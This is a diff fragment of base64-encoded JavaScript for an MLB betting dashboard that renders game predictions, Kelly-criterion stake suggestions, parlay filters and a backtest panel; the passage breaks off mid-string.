+`bD9rZWxseShyLndpbm5lclAsYm1sKSoxMDA6MDt2YXIgc3Rha2U9Ym1sPyhr`,
+`LzEwMCpTLmJhbmtyb2xsKS50b0ZpeGVkKDIpOictLSc7dmFyIHdpbj1ibWw/`,
+`KChtbERlYyhibWwpLTEpKihrLzEwMCpTLmJhbmtyb2xsKSkudG9GaXhlZCgy`,
+`KTonLS0nO3ZhciBlPWJtbD9lZGdlQ2FsYyhyLndpbm5lclAsYm1sKTpudWxs`,
+`O3ZhciBodG1sPScnO2lmKHIudmVudWV8fHIud2VhdGhlcilodG1sKz0nPGRp`,
+`diBzdHlsZT0ibWFyZ2luLWJvdHRvbToxMnB4O3BhZGRpbmc6OHB4IDE0cHg7`,
+`YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC4wMik7Ym9yZGVyOjFweCBz`,
+`b2xpZCAjMjUyMDE1O2JvcmRlci1yYWRpdXM6OHB4O2Rpc3BsYXk6ZmxleDtn`,
+`YXA6MTJweDtmbGV4LXdyYXA6d3JhcCI+Jysoci52ZW51ZT8nPHNwYW4gc3R5`,
+`bGU9ImZvbnQtc2l6ZToxMXB4O2NvbG9yOiM2YTVhM2EiPicrci52ZW51ZSsn`,
+`PC9zcGFuPic6JycpKyhyLndlYXRoZXI/JzxzcGFuIHN0eWxlPSJmb250LXNp`,
+`emU6MTFweDtjb2xvcjojM2E0YTJhIj4nK3Iud2VhdGhlcisnPC9zcGFuPic6`,
+`JycpKyc8c3BhbiBzdHlsZT0iZm9udC1zaXplOjExcHg7Y29sb3I6IzJhM2Ey`,
+`YSI+UGFyayAnK3IucGFya0IrJzwvc3Bhbj48L2Rpdj4nO2h0bWwrPSc8ZGl2`,
+`IGNsYXNzPSJjYXJkIj48ZGl2IHN0eWxlPSJkaXNwbGF5OmdyaWQ7Z3JpZC10`,
+`ZW1wbGF0ZS1jb2x1bW5zOjFmciBhdXRvIDFmcjtnYXA6MTJweDthbGlnbi1p`,
+`dGVtczpjZW50ZXI7bWFyZ2luLWJvdHRvbToxOHB4Ij48ZGl2PjxkaXYgc3R5`,
+`bGU9ImZvbnQtc2l6ZToxN3B4O2ZvbnQtZmFtaWx5Okdlb3JnaWEsc2VyaWY7`,
+`Zm9udC13ZWlnaHQ6OTAwO2NvbG9yOicrKHIud2lubmVyPT09ci5hTmFtZT8n`,
+`I2UwYjA0MCc6JyM1NTUnKSsnIj4nK3IuYU5hbWUrJzwvZGl2PjxkaXYgc3R5`,
+`bGU9ImZvbnQtc2l6ZTo5cHg7Y29sb3I6Jysoci53aW5uZXI9PT1yLmFOYW1l`,
+`PycjYzg5MjJhJzonIzMzMycpKyc7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNl`,
+`O2xldHRlci1zcGFjaW5nOjJweDttYXJnaW4tdG9wOjJweCI+Jysoci53aW5u`,
+`ZXI9PT1yLmFOYW1lPydQUkVESUNURUQgV0lOTkVSJzonVU5ERVJET0cnKSsn`,
+`PC9kaXY+PGRpdiBzdHlsZT0iZm9udC1zaXplOjEwcHg7Y29sb3I6IzRhM2Ex`,
+`YTttYXJnaW4tdG9wOjNweCI+U1A6ICcrci5hUGl0Y2hlcisnPC9kaXY+PC9k`,
+`aXY+PGRpdiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPjxkaXYgc3R5bGU9`,
+`ImZvbnQtc2l6ZTo5cHg7Y29sb3I6IzJlMjQxNjtsZXR0ZXItc3BhY2luZzo0`,
+`cHgiPlZTPC9kaXY+PGRpdiBzdHlsZT0iZm9udC1zaXplOjEycHg7Y29sb3I6`,
+`IzU1NTtmb250LWZhbWlseTptb25vc3BhY2U7bWFyZ2luLXRvcDozcHgiPicr`,
+`ci5wcm9qU2NvcmUrJzwvZGl2PjwvZGl2PjxkaXYgc3R5bGU9InRleHQtYWxp`,
+`Z246cmlnaHQiPjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxN3B4O2ZvbnQtZmFt`,
+`aWx5Okdlb3JnaWEsc2VyaWY7Zm9udC13ZWlnaHQ6OTAwO2NvbG9yOicrKHIu`,
+`d2lubmVyPT09ci5iTmFtZT8nI2UwYjA0MCc6JyM1NTUnKSsnIj4nK3IuYk5h`,
+`bWUrJzwvZGl2PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZTo5cHg7Y29sb3I6Jyso`,
+`ci53aW5uZXI9PT1yLmJOYW1lPycjYzg5MjJhJzonIzMzMycpKyc7dGV4dC10`,
+`cmFuc2Zvcm06dXBwZXJjYXNlO2xldHRlci1zcGFjaW5nOjJweDttYXJnaW4t`,
+`dG9wOjJweCI+Jysoci53aW5uZXI9PT1yLmJOYW1lPydQUkVESUNURUQgV0lO`,
+`TkVSJzonVU5ERVJET0cnKSsnPC9kaXY+PGRpdiBzdHlsZT0iZm9udC1zaXpl`,
+`OjEwcHg7Y29sb3I6IzNhM2E0YTttYXJnaW4tdG9wOjNweCI+U1A6ICcrci5i`,
+`UGl0Y2hlcisnPC9kaXY+PC9kaXY+PC9kaXY+Jyt3aW5CYXIoci5wY3RBLHIu`,
+`cGN0QikrJzwvZGl2Pic7aHRtbCs9JzxkaXYgY2xhc3M9ImNhcmQiPjxkaXYg`,
+`Y2xhc3M9ImxibCI+RnVsbC1HYW1lIFBpdGNoaW5nPC9kaXY+PGRpdiBzdHls`,
+`ZT0iZGlzcGxheTpncmlkO2dyaWQtdGVtcGxhdGUtY29sdW1uczoxZnIgMWZy`,
+`O2dhcDo4cHgiPicrcGl0Y2hCb3goci5hTmFtZSxyLmFCbGVuZCxyLmFQaXRj`,
+`aGVyKStwaXRjaEJveChyLmJOYW1lLHIuYkJsZW5kLHIuYlBpdGNoZXIpKyc8`,
+`L2Rpdj48L2Rpdj4nO2h0bWwrPSc8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7`,
+`Z2FwOjhweDttYXJnaW4tYm90dG9tOjEycHg7ZmxleC13cmFwOndyYXAiPjxk`,
+`aXYgY2xhc3M9ImNoaXAgJysoci53aW5uZXI9PT1yLmFOYW1lPydnb2xkJzon`,
+`JykrJyI+PGRpdiBjbGFzcz0iY2wiPicrci5hTmFtZS5zcGxpdCgnICcpLnBv`,
+`cCgpKycgTUw8L2Rpdj48ZGl2IGNsYXNzPSJjdiI+JytyLm1sQSsnPC9kaXY+`,
+`PC9kaXY+PGRpdiBjbGFzcz0iY2hpcCAnKyhyLndpbm5lcj09PXIuYk5hbWU/`,
+`J2dvbGQnOicnKSsnIj48ZGl2IGNsYXNzPSJjbCI+JytyLmJOYW1lLnNwbGl0`,
+`KCcgJykucG9wKCkrJyBNTDwvZGl2PjxkaXYgY2xhc3M9ImN2Ij4nK3IubWxC`,
+`Kyc8L2Rpdj48L2Rpdj48ZGl2IGNsYXNzPSJjaGlwIj48ZGl2IGNsYXNzPSJj`,
+`bCI+Ty9VPC9kaXY+PGRpdiBjbGFzcz0iY3YiPicrci5vdSsnPC9kaXY+PC9k`,
+`aXY+PGRpdiBjbGFzcz0iY2hpcCAnKyhyLmNvbmZpZGVuY2U9PT0nSGlnaCc/`,
+`J2dvbGQnOicnKSsnIj48ZGl2IGNsYXNzPSJjbCI+Q29uZmlkZW5jZTwvZGl2`,
+`PjxkaXYgY2xhc3M9ImN2Ij4nK3IuY29uZmlkZW5jZSsnPC9kaXY+PC9kaXY+`,
+`PC9kaXY+JztodG1sKz0nPGRpdiBjbGFzcz0iY2FyZCI+PGRpdiBjbGFzcz0i`,
+`bGJsIj5GYWN0b3IgQnJlYWtkb3duPC9kaXY+JztyLmZhY3RvcnMuZm9yRWFj`,
+`aChmdW5jdGlvbihmKXtodG1sKz1mYWN0b3JSb3coZik7fSk7aHRtbCs9Jzwv`,
+`ZGl2Pic7aHRtbCs9JzxkaXYgY2xhc3M9ImNhcmQiPjxkaXYgY2xhc3M9Imxi`,
+`bCIgc3R5bGU9ImNvbG9yOiM1YWJhOGEiPktlbGx5IFN0YWtlPC9kaXY+Jztp`,
+`ZighYm1sKXtodG1sKz0nPGRpdiBzdHlsZT0iYmFja2dyb3VuZDpyZ2JhKDIw`,
+`MCwxNDYsNDIsLjA1KTtib3JkZXI6MXB4IHNvbGlkICMyZTI0MTY7Ym9yZGVy`,
+`LXJhZGl1czo4cHg7cGFkZGluZzoxNHB4O3RleHQtYWxpZ246Y2VudGVyIj48`,
+`ZGl2IHN0eWxlPSJmb250LXNpemU6MTNweDtjb2xvcjojNmE1YTNhO21hcmdp`,
+`bi1ib3R0b206NnB4Ij5FbnRlciBCb29rIE1MIHRvIGNhbGN1bGF0ZSBzdGFr`,
+`ZTwvZGl2PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxMXB4O2NvbG9yOiMyZTI0`,
+`MTY7bGluZS1oZWlnaHQ6MS42Ij5HbyB0byBEYWlseSBCb2FyZCBhbmQgZW50`,
+`ZXIgdGhlIEthbHNoaSBtb25leWxpbmUgZm9yICcrci53aW5uZXIrJyBpbiB0`,
+`aGUgQm9vayBNTCBmaWVsZC48L2Rpdj48L2Rpdj4nO31lbHNle2h0bWwrPSc8`,
+`ZGl2IGNsYXNzPSJrZWxseS1ncmlkIj48ZGl2IGNsYXNzPSJrZWxseS1ib3gi`,
+`IHN0eWxlPSJiYWNrZ3JvdW5kOnJnYmEoNTgsMTM4LDkwLC4wNik7Ym9yZGVy`,
+`OjFweCBzb2xpZCAjM2E4YTVhIj48ZGl2IHN0eWxlPSJmb250LXNpemU6OXB4`,
+`O2NvbG9yOiM2YTVhM2E7bGV0dGVyLXNwYWNpbmc6MnB4O3RleHQtdHJhbnNm`,
+`b3JtOnVwcGVyY2FzZTttYXJnaW4tYm90dG9tOjZweCI+UmVjb21tZW5kZWQ8`,
+`L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MjJweDtmb250LXdlaWdodDo5`,
+`MDA7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2NvbG9yOiM1YWJhOGEiPiQnK3N0`,
+`YWtlKyc8L2Rpdj48ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjoj`,
+`NmE1YTNhO21hcmdpbi10b3A6MnB4Ij4nK2sudG9GaXhlZCgxKSsnJSBvZiAk`,
+`JytTLmJhbmtyb2xsKyc8L2Rpdj4nKyhlIT09bnVsbD8nPGRpdiBzdHlsZT0i`,
+`bWFyZ2luLXRvcDo0cHgiPicrZWRnZUJhZGdlKGUpKyc8L2Rpdj4nOicnKSsn`,
+`PC9kaXY+JztodG1sKz0nPGRpdiBjbGFzcz0ia2VsbHktYm94IiBzdHlsZT0i`,
+`YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC4wMik7Ym9yZGVyOjFweCBz`,
+`b2xpZCAjMmUyNDE2Ij48ZGl2IHN0eWxlPSJmb250LXNpemU6OXB4O2NvbG9y`,
+`OiM2YTVhM2E7bGV0dGVyLXNwYWNpbmc6MnB4O3RleHQtdHJhbnNmb3JtOnVw`,
+`cGVyY2FzZTttYXJnaW4tYm90dG9tOjZweCI+SWYgV2luPC9kaXY+PGRpdiBz`,
+`dHlsZT0iZm9udC1zaXplOjIycHg7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQtZmFt`,
+`aWx5Om1vbm9zcGFjZTtjb2xvcjojYzg5MjJhIj4rJCcrd2luKyc8L2Rpdj48`,
+`ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtjb2xvcjojNmE1YTNhO21hcmdp`,
+`bi10b3A6MnB4Ij4nK3Iud2lubmVyKycgJytibWwrJzwvZGl2PjxkaXYgc3R5`,
+`bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOiMyZTI0MTY7bWFyZ2luLXRvcDox`,
+`cHgiPicrKHIud2lubmVyUCoxMDApLnRvRml4ZWQoMSkrJyUgbW9kZWw8L2Rp`,
+`dj48L2Rpdj48L2Rpdj4nO2h0bWwrPSc8YnV0dG9uIG9uY2xpY2s9InF1aWNr`,
+`TG9nKCkiIHN0eWxlPSJ3aWR0aDoxMDAlO21hcmdpbi10b3A6MTBweDtwYWRk`,
+`aW5nOjlweDtib3JkZXItcmFkaXVzOjZweDtib3JkZXI6MXB4IHNvbGlkICNj`,
+`ODkyMmE7YmFja2dyb3VuZDpyZ2JhKDIwMCwxNDYsNDIsLjA4KTtjb2xvcjoj`,
+`ZTBiMDQwO2ZvbnQtd2VpZ2h0OjcwMDtmb250LXNpemU6MTJweDtjdXJzb3I6`,
+`cG9pbnRlciI+TG9nIFRoaXMgVHJhZGU8L2J1dHRvbj4nO31odG1sKz0nPC9k`,
+`aXY+JztlbC5pbm5lckhUTUw9aHRtbDt9CmZ1bmN0aW9uIHF1aWNrTG9nKCl7`,
+`aWYoIVMuZGV0YWlsKXJldHVybjt2YXIgcj1TLmRldGFpbCxibWw9Uy5ib29r`,
+`T2Rkc1tyLmdhbWVQa118fCcnO3ZhciBzdGFrZT1ibWw/KGtlbGx5KHIud2lu`,
+`bmVyUCxibWwpKlMuYmFua3JvbGwpLnRvRml4ZWQoMCk6Jyc7dmFyIHRyYWRl`,
+`cz1sb2FkVHJhZGVzKCk7dHJhZGVzLnVuc2hpZnQoe2lkOkRhdGUubm93KCks`,
+`ZGF0ZTpTLmRhdGUsdGVhbTpyLndpbm5lcixvcHBvbmVudDpyLndpbm5lcj09`,
+`PXIuYU5hbWU/ci5iTmFtZTpyLmFOYW1lLGNvbmZpZGVuY2U6ci5jb25maWRl`,
+`bmNlLG1vZGVsUDooci53aW5uZXJQKjEwMCkudG9GaXhlZCgxKSxtb2RlbE1M`,
+`OnIud2lubmVyTUwsYm9va01MOmJtbCxlZGdlUGN0OmJtbD8oZWRnZUNhbGMo`,
+`ci53aW5uZXJQLGJtbCkqMTAwKS50b0ZpeGVkKDEpOicnLHN0YWtlOnN0YWtl`,
+`LHJlc3VsdDoncGVuZGluZycscG5sOicnfSk7c2F2ZVRyYWRlcyh0cmFkZXMp`,
+`O2FsZXJ0KCdUcmFkZSBsb2dnZWQhJyk7fQpmdW5jdGlvbiByZW5kZXJQbGF5`,
+`cygpe3ZhciBlbD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGFiMicpO2lm`,
+`KCFlbClyZXR1cm47dmFyIGh0bWw9JzxkaXYgY2xhc3M9ImNhcmQiIHN0eWxl`,
+`PSJtYXJnaW4tYm90dG9tOjE0cHgiPjxkaXYgY2xhc3M9ImxibCIgc3R5bGU9`,
+`ImNvbG9yOiM1YWJhOGEiPlZhbHVlIEZpbHRlcjwvZGl2PjxkaXYgc3R5bGU9`,
+`ImZvbnQtc2l6ZToxMXB4O2NvbG9yOiM0YTVhM2E7bGluZS1oZWlnaHQ6MS43`,
+`O21hcmdpbi1ib3R0b206MTBweCI+RW50ZXIgYm9vayBvZGRzIGluIERhaWx5`,
+`IEJvYXJkLiBPbmx5IHBsYXlzIHdoZXJlIG1vZGVsIGJlYXRzIGJvb2sgaW1w`,
+`bGllZCBwcm9iYWJpbGl0eSBzaG93bi48L2Rpdj48ZGl2IHN0eWxlPSJkaXNw`,
+`bGF5OmZsZXg7Z2FwOjEwcHg7YWxpZ24taXRlbXM6Y2VudGVyO2ZsZXgtd3Jh`,
+`cDp3cmFwIj48ZGl2IHN0eWxlPSJmbGV4OjEiPjxkaXYgc3R5bGU9ImZvbnQt`,
+`c2l6ZTo5cHg7Y29sb3I6IzJlMjQxNjtsZXR0ZXItc3BhY2luZzoycHg7bWFy`,
+`Z2luLWJvdHRvbTo0cHgiPk1JTiBFREdFPC9kaXY+PGRpdiBzdHlsZT0iZGlz`,
+`cGxheTpmbGV4O2dhcDo2cHgiPic7WzEsMiwzLDVdLmZvckVhY2goZnVuY3Rp`,
+`b24ocGN0KXtodG1sKz0nPGJ1dHRvbiBvbmNsaWNrPSJzZXRNaW5FZGdlKCcr`,
+`cGN0KycpIiBzdHlsZT0icGFkZGluZzo1cHggMTJweDtib3JkZXItcmFkaXVz`,
+`OjRweDtib3JkZXI6MXB4IHNvbGlkICcrKFMubWluRWRnZT09PXBjdD8nIzVh`,
+`YmE4YSc6JyMyNTIwMTUnKSsnO2JhY2tncm91bmQ6JysoUy5taW5FZGdlPT09`,
+`cGN0PydyZ2JhKDkwLDE4NiwxMzgsLjEyKSc6J3RyYW5zcGFyZW50JykrJztj`,
+`b2xvcjonKyhTLm1pbkVkZ2U9PT1wY3Q/JyM1YWJhOGEnOicjNmE1YTNhJykr`,
+`Jztmb250LXNpemU6MTFweDtjdXJzb3I6cG9pbnRlcjtmb250LWZhbWlseTpt`,
+`b25vc3BhY2UiPicrcGN0KyclKzwvYnV0dG9uPic7fSk7aHRtbCs9JzwvZGl2`,
+`PjwvZGl2PjxidXR0b24gb25jbGljaz0icmVidWlsZFBsYXlzKCkiIHN0eWxl`,
+`PSJwYWRkaW5nOjhweCAxNnB4O2JvcmRlci1yYWRpdXM6NnB4O2JvcmRlcjpu`,
+`b25lO2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjM2E4YTVh`,
+`LCMyYTZhNGEpO2NvbG9yOiMwODA2MDA7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQt`,
+`c2l6ZToxMnB4O2xldHRlci1zcGFjaW5nOjJweDt0ZXh0LXRyYW5zZm9ybTp1`,
+`cHBlcmNhc2U7Y3Vyc29yOnBvaW50ZXIiPlJlYnVpbGQ8L2J1dHRvbj48L2Rp`,
+`dj4nO2lmKFMucGFybGF5cylodG1sKz0nPGRpdiBzdHlsZT0ibWFyZ2luLXRv`,
+`cDo4cHg7Zm9udC1zaXplOjEwcHg7Y29sb3I6IzJlMjQxNiI+JysoT2JqZWN0`,
+`LnZhbHVlcyhTLmJvb2tPZGRzKS5maWx0ZXIoQm9vbGVhbikubGVuZ3RoPjA/`,
+`T2JqZWN0LnZhbHVlcyhTLmJvb2tPZGRzKS5maWx0ZXIoQm9vbGVhbikubGVu`,
+`Z3RoKycgYm9vayBsaW5lcyAnK1MucGFybGF5cy5lZGdlRmlsdGVyZWQrJyBw`,
+`YXNzIGZpbHRlcic6J05vIGJvb2sgb2RkcyAtIHNob3dpbmcgYWxsIEhpZ2gv`,
+`TWVkaXVtIHBsYXlzLicpKyc8L2Rpdj4nO2h0bWwrPSc8L2Rpdj4nO2lmKCFT`,
+`LnBhcmxheXMpe2h0bWwrPSc8ZGl2IGNsYXNzPSJjYXJkIiBzdHlsZT0idGV4`,
+`dC1hbGlnbjpjZW50ZXI7cGFkZGluZzozMnB4Ij48ZGl2IHN0eWxlPSJmb250`,
+`LXNpemU6MzJweDttYXJnaW4tYm90dG9tOjEwcHgiPiYjMTI3OTE5OzwvZGl2`,
+`PjxkaXYgc3R5bGU9ImNvbG9yOiM2YTVhM2E7bWFyZ2luLWJvdHRvbToxNnB4`,
+`Ij5SdW4gQW5hbHl6ZSBBbGwgR2FtZXMgZmlyc3QuPC9kaXY+PGJ1dHRvbiBv`,
+`bmNsaWNrPSJzaG93VGFiKDApIiBzdHlsZT0icGFkZGluZzo5cHggMjBweDti`,
+`b3JkZXItcmFkaXVzOjZweDtib3JkZXI6MXB4IHNvbGlkICNjODkyMmE7YmFj`,
+`a2dyb3VuZDp0cmFuc3BhcmVudDtjb2xvcjojYzg5MjJhO2ZvbnQtc2l6ZTox`,
+`MnB4O2N1cnNvcjpwb2ludGVyIj5HbyB0byBEYWlseSBCb2FyZDwvYnV0dG9u`,
+`PjwvZGl2Pic7fWVsc2V7aWYoUy5wYXJsYXlzLnNpbmdsZXMubGVuZ3RoKXto`,
+`dG1sKz0nPGRpdiBzdHlsZT0iZm9udC1zaXplOjEwcHg7bGV0dGVyLXNwYWNp`,
+`bmc6M3B4O2NvbG9yOiNjODkyMmE7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNl`,
+`O21hcmdpbi1ib3R0b206OHB4Ij5CZXN0IFNpbmdsZXM8L2Rpdj4nO1MucGFy`,
+`bGF5cy5zaW5nbGVzLmZvckVhY2goZnVuY3Rpb24ocCl7aHRtbCs9cGFybGF5`,
+`Q2FyZEhUTUwocCk7fSk7fWlmKFMucGFybGF5cy5wYXJsYXlzMi5sZW5ndGgp`,
+`e2h0bWwrPSc8ZGl2IHN0eWxlPSJmb250LXNpemU6MTBweDtsZXR0ZXItc3Bh`,
+`Y2luZzozcHg7Y29sb3I6IzVhOWFjMDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNh`,
+`c2U7bWFyZ2luLWJvdHRvbTo4cHg7bWFyZ2luLXRvcDoxNnB4Ij4yLUxlZyBQ`,
+`YXJsYXlzPC9kaXY+JztTLnBhcmxheXMucGFybGF5czIuZm9yRWFjaChmdW5j`,
+`dGlvbihwKXtodG1sKz1wYXJsYXlDYXJkSFRNTChwKTt9KTt9aWYoUy5wYXJs`,
+`YXlzLnBhcmxheXMzLmxlbmd0aCl7aHRtbCs9JzxkaXYgc3R5bGU9ImZvbnQt`,
+`c2l6ZToxMHB4O2xldHRlci1zcGFjaW5nOjNweDtjb2xvcjojOWE1YWMwO3Rl`,
+`eHQtdHJhbnNmb3JtOnVwcGVyY2FzZTttYXJnaW4tYm90dG9tOjhweDttYXJn`,
+`aW4tdG9wOjE2cHgiPjMtTGVnIFBhcmxheTwvZGl2Pic7Uy5wYXJsYXlzLnBh`,
+`cmxheXMzLmZvckVhY2goZnVuY3Rpb24ocCl7aHRtbCs9cGFybGF5Q2FyZEhU`,
+`TUwocCk7fSk7fWlmKCFTLnBhcmxheXMuc2luZ2xlcy5sZW5ndGgpaHRtbCs9`,
+`JzxkaXYgY2xhc3M9ImNhcmQiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjtw`,
+`YWRkaW5nOjI0cHgiPjxkaXYgc3R5bGU9ImNvbG9yOiM2YTVhM2EiPk5vIHF1`,
+`YWxpZnlpbmcgcGxheXMuIExvd2VyIGVkZ2UgdGhyZXNob2xkIG9yIGVudGVy`,
+`IGJvb2sgb2Rkcy48L2Rpdj48L2Rpdj4nO2h0bWwrPSc8ZGl2IHN0eWxlPSJt`,
+`YXJnaW4tdG9wOjIwcHg7cGFkZGluZzoxMnB4IDE0cHg7YmFja2dyb3VuZDpy`,
+`Z2JhKDEzOCw1OCw1OCwuMDYpO2JvcmRlcjoxcHggc29saWQgIzNhMWExYTti`,
+`b3JkZXItcmFkaXVzOjhweCI+PGRpdiBzdHlsZT0iZm9udC1zaXplOjEwcHg7`,
+`Y29sb3I6IzZhM2EzYTtsaW5lLWhlaWdodDoxLjciPkZvciBlbnRlcnRhaW5t`,
+`ZW50IG9ubHkuIE5vdCBmaW5hbmNpYWwgYWR2aWNlLjwvZGl2PjwvZGl2Pic7`,
+`fWVsLmlubmVySFRNTD1odG1sO30KZnVuY3Rpb24gc2V0TWluRWRnZShuKXtz`,
+`U2V0KCdtaW5FZGdlJyxuKTtyZW5kZXJQbGF5cygpO30KZnVuY3Rpb24gcmVi`,
+`dWlsZFBsYXlzKCl7aWYoUy5yZXN1bHRzLmxlbmd0aClTLnBhcmxheXM9YnVp`,
+`bGRQYXJsYXlzKFMucmVzdWx0cyxTLmJvb2tPZGRzLFMubWluRWRnZSk7cmVu`,
+`ZGVyUGxheXMoKTt9CmZ1bmN0aW9uIHJlbmRlckJhY2t0ZXN0KCl7dmFyIGVs`,
+`PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0YWIzJyk7aWYoIWVsKXJldHVy`,
+`bjt2YXIgaHRtbD0nPGRpdiBjbGFzcz0iY2FyZCIgc3R5bGU9Im1hcmdpbi1i`,
+`b3R0b206MTRweCI+PGRpdiBjbGFzcz0ibGJsIj5CYWNrdGVzdCBSYW5nZTwv`,
+`ZGl2PjxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOiM0YTRhMmE7`,
+`bWFyZ2luLWJvdHRvbToxMHB4O2xpbmUtaGVpZ2h0OjEuNiI+VXNlcyBjdXJy`,
+`ZW50IHNlYXNvbiBzdGF0cy4gQmVzdCB3aXRoIDItNCB3ZWVrIHJhbmdlcyB3`,
+`aXRoaW4gQXByaWwtT2N0b2Jlci48L2Rpdj48ZGl2IHN0eWxlPSJkaXNwbGF5`,
+`OmZsZXg7Z2FwOjhweDtmbGV4LXdyYXA6d3JhcDthbGlnbi1pdGVtczpmbGV4`,
+`LWVuZCI+PGRpdiBzdHlsZT0iZmxleDoxIDEgMTIwcHgiPjxkaXYgc3R5bGU9`,
+`ImZvbnQtc2l6ZTo5cHg7Y29sb3I6IzJlMjQxNjtsZXR0ZXItc3BhY2luZzoy`,
+`cHg7bWFyZ2luLWJvdHRvbTozcHgiPkZST008L2Rpdj48aW5wdXQgdHlwZT0i`,
+`ZGF0ZSIgaWQ9ImJ0LXN0YXJ0IiB2YWx1ZT0iJytTLmJ0U3RhcnQrJyIgc3R5`,
+`bGU9IndpZHRoOjEwMCU7Zm9udC1zaXplOjEzcHgiPjwvZGl2PjxkaXYgc3R5`,
+`bGU9ImZsZXg6MSAxIDEyMHB4Ij48ZGl2IHN0eWxlPSJmb250LXNpemU6OXB4`,
+`O2NvbG9yOiMyZTI0MTY7bGV0dGVyLXNwYWNpbmc6MnB4O21hcmdpbi1ib3R0`,
+`b206M3B4Ij5UTzwvZGl2PjxpbnB1dCB0eXBlPSJkYXRlIiBpZD0iYnQtZW5k`,
+`IiB2YWx1ZT0iJytTLmJ0RW5kKyciIHN0eWxlPSJ3aWR0aDoxMDAlO2ZvbnQt`,
+`c2l6ZToxM3B4Ij48L2Rpdj48YnV0dG9uIGlkPSJidC1idG4iIG9uY2xpY2s9`,
+`ImRvQmFja3Rlc3QoKSIgJysoUy5idExvYWRpbmc/J2Rpc2FibGVkJzonJykr`,
+`JyBzdHlsZT0icGFkZGluZzo5cHggMTZweDtib3JkZXItcmFkaXVzOjZweDti`,
+`b3JkZXI6bm9uZTtiYWNrZ3JvdW5kOicrKFMuYnRMb2FkaW5nPycjMmUyNDE2`,
+`JzonbGluZWFyLWdyYWRpZW50KDEzNWRlZywjYzg5MjJhLCM5YTZlMTgpJykr`,
+`Jztjb2xvcjonKyhTLmJ0TG9hZGluZz8nIzZhNWEzYSc6JyMwODA2MDAnKSsn`,
+`O2ZvbnQtd2VpZ2h0OjkwMDtmb250LXNpemU6MTJweDtsZXR0ZXItc3BhY2lu`,
+`ZzoycHg7dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2N1cnNvcjonKyhTLmJ0`,
+`TG9hZGluZz8nbm90LWFsbG93ZWQnOidwb2ludGVyJykrJztkaXNwbGF5OmZs`,
+`ZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo4cHgiPic7aWYoUy5idExvYWRp`,
+`bmcpaHRtbCs9JzxzcGFuIGNsYXNzPSJzcGluIj48L3NwYW4+JztodG1sKz0o`,
+`Uy5idExvYWRpbmc/J1J1bm5pbmcuLi4nOidSdW4gQmFja3Rlc3QnKSsnPC9i`,
+`dXR0b24+PC9kaXY+JztpZihTLmJ0TG9hZGluZylodG1sKz0nPGRpdiBzdHls`,
+`ZT0ibWFyZ2luLXRvcDoxMHB4O2ZvbnQtc2l6ZToxMXB4O2NvbG9yOiM2YTVh`,
+`M2E7ZGlzcGxheTpmbGV4O2dhcDo4cHg7YWxpZ24taXRlbXM6Y2VudGVyIj48`,
+`c3BhbiBjbGFzcz0ic3BpbiI+PC9zcGFuPicrUy5idFByb2dyZXNzKyc8L2Rp`,
+`dj4nO2h0bWwrPSc8L2Rpdj4nO2lmKFMuYnRFcnJvcilodG1sKz0nPGRpdiBj`,
+`bGFzcz0iZXJyb3ItYm94Ij4nK1MuYnRFcnJvcisnPC9kaXY+JztpZihTLmJ0`,
+`UmVzdWx0cyl7dmFyIGJ0PVMuYnRSZXN1bHRzO2h0bWwrPSc8ZGl2IGNsYXNz`,
+`PSJjYXJkIj48ZGl2IHN0eWxlPSJkaXNwbGF5OmdyaWQ7Z3JpZC10ZW1wbGF0`,
+`ZS1jb2x1bW5zOjFmciAxZnIgMWZyIDFmcjtnYXA6OHB4O21hcmdpbi1ib3R0`,
+`b206MTBweCI+JztbWydPdmVyYWxsJyxidC5hbGwsJyNjOGI4OTAnXSxbJ0hp`,
+`Z2gnLGJ0LmhpZ2gsJyNjODkyMmEnXSxbJ01lZGl1bScsYnQubWVkaXVtLCcj`,
+`OGE4YTNhJ10sWydMb3cnLGJ0LmxvdywnIzZhNWEzYSddXS5mb3JFYWNoKGZ1`,
+`bmN0aW9uKGl0ZW0pe2h0bWwrPSc8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOnJn`,
+`YmEoMjU1LDI1NSwyNTUsLjAyKTtib3JkZXI6MXB4IHNvbGlkICMyZTI0MTY7`,
+`Ym9yZGVyLXJhZGl1czo4cHg7cGFkZGluZzoxMHB4IDZweDt0ZXh0LWFsaWdu`,
+`OmNlbnRlciI+PGRpdiBzdHlsZT0iZm9udC1zaXplOjlweDtjb2xvcjojMmUy`,
+`NDE2O2xldHRlci1zcGFjaW5nOjJweDt0ZXh0LXRyYW5zZm9ybTp1cHBlcmNh`,
+`c2U7bWFyZ2luLWJvdHRvbTo0cHgiPicraXRlbVswXSsnPC9kaXY+PGRpdiBz`,
+`dHlsZT0iZm9udC1zaXplOjE4cHg7Zm9udC13ZWlnaHQ6OTAwO2ZvbnQtZmFt`,
+`aWx5Om1vbm9zcGFjZTtjb2xvcjonK2l0ZW1bMl0rJyI+JysoaXRlbVsxXS5w`,
+`Y3QhPT1udWxsP2l0ZW1bMV0ucGN0KyclJzonLS0nKSsnPC9kaXY+PGRpdiBz`,
+`dHlsZT0iZm9udC1zaXplOjEwcHg7Y29sb3I6IzZhNWEzYTttYXJnaW4tdG9w`,
